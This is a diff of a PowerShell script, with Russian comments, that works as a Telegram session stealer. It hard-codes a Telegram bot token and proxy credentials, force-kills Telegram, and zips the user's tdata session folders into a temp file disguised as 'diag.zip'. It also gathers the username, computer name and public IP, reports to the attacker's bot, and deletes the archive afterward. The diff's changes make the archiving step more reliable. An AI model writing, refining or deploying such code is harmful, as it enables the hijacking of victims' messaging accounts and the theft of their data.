@@ -5,16 +5,12 @@
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
 $chatId   = "8620709143"
 
-# --- Прокси данные (раздельно) ---
 $proxyUrl  = "http://gate.proxydata.ru:3129"
 $proxyUser = "user-xpx93ax5"
 $proxyPass = "5pxp942ldb7jtnh2"
 
-# Объект WebProxy (для WebClient)
 $proxy = New-Object System.Net.WebProxy($proxyUrl, $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential($proxyUser, $proxyPass)
-
-# Устанавливаем глобальный прокси для всех WebRequest (включая Invoke-WebRequest)
 [System.Net.WebRequest]::DefaultWebProxy = $proxy
 
 # ---------- Функции ----------
@@ -94,14 +90,58 @@ try {
         exit
     }
 
-    # 2. Завершаем Telegram
+    # 2. Завершаем Telegram (убеждаемся, что убит)
     Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force
+    Start-Sleep -Milliseconds 500  # даём время освободить файлы
 
-    # 3. Архивация
+    # 3. Архивация (надёжная)
     $zip = "$env:TEMP\diag.zip"
-    Compress-Archive -Path $paths -DestinationPath $zip -Force
+    if (Test-Path $zip) { Remove-Item $zip -Force }
 
-    # 4. Сбор информации (глобальный прокси уже работает)
+    # Проверяем, что все папки доступны
+    $validPaths = @()
+    foreach ($p in $paths) {
+        if (Test-Path $p) { $validPaths += $p }
+    }
+    if ($validPaths.Count -eq 0) {
+        Send-TelegramMessage "❌ Нет доступных папок tdata"
+        exit
+    }
+
+    # Используем Compress-Archive с явным указанием путей
+    try {
+        Compress-Archive -Path $validPaths -DestinationPath $zip -Force -ErrorAction Stop
+        # Проверяем, что архив создался и не пустой
+        if (-not (Test-Path $zip) -or (Get-Item $zip).Length -eq 0) {
+            throw "Архив пустой или не создан"
+        }
+    } catch {
+        # Если Compress-Archive упал, пробуем через .NET ZipFile
+        Write-Host "⚠️ Compress-Archive не сработал, пробуем .NET ZipFile..." -ForegroundColor Yellow
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        try {
+            $zipFile = [System.IO.Compression.ZipFile]::Open($zip, 'Create')
+            foreach ($folder in $validPaths) {
+                $folderItem = Get-Item $folder
+                # Добавляем все файлы из папки
+                Get-ChildItem -Path $folderItem.FullName -Recurse -File | ForEach-Object {
+                    $relativePath = $_.FullName.Substring($folderItem.FullName.Length + 1)
+                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
+                        $zipFile,
+                        $_.FullName,
+                        $relativePath,
+                        [System.IO.Compression.CompressionLevel]::Optimal
+                    )
+                }
+            }
+            $zipFile.Dispose()
+        } catch {
+            Send-TelegramMessage "❌ Ошибка создания ZIP: $_"
+            exit
+        }
+    }
+
+    # 4. Сбор информации
     $user = $env:USERNAME
     $comp = $env:COMPUTERNAME
     $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()
@@ -156,6 +196,7 @@ try {
         }
     }
 
+    # 6. Удаляем архив
     Remove-Item $zip -Force -ErrorAction SilentlyContinue
     Send-TelegramMessage "✅ Done"
 
